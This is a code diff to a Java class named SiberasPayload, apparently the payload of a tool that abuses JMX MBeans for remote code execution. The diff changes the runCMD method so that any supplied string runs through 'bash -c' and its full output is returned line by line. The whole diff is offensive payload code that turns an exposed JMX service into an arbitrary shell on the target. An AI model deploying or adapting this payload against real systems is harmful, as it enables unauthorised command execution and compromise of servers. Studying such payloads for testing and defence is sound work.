@@ -10,25 +10,29 @@ public class SiberasPayload implements SiberasPayloadMBean {
 	public String runCMD(String cmd) {
 
 		try {
+			
+			String[] full_cmd = new String[]{"bash","-c",cmd};
 			java.lang.Runtime runtime = java.lang.Runtime.getRuntime();
-			java.lang.Process p = runtime.exec(cmd);
+			java.lang.Process p = runtime.exec(full_cmd);
 
 			p.waitFor();
 
 			java.io.InputStream is = p.getInputStream();
 			java.io.BufferedReader reader = new java.io.BufferedReader(new InputStreamReader(is));
-        
-			
-			StringBuilder output = new StringBuilder();
-			String tmpString;
-			while ((tmpString = reader.readLine()) != null) {
-				output.append(tmpString);
+      
+			java.lang.StringBuilder builder = new StringBuilder();
+			String line = null;
+			while ( (line = reader.readLine()) != null) {
+			   builder.append(line);
+			   builder.append(System.getProperty("line.separator"));
 			}
-        
+			String result = builder.toString();
+			
 			is.close();
-			return output.toString();
-		}
-		catch(Exception ex) {
+			
+			return result;
+
+		} catch(Exception ex) {
 			return ex.getMessage();
 		}
 	}
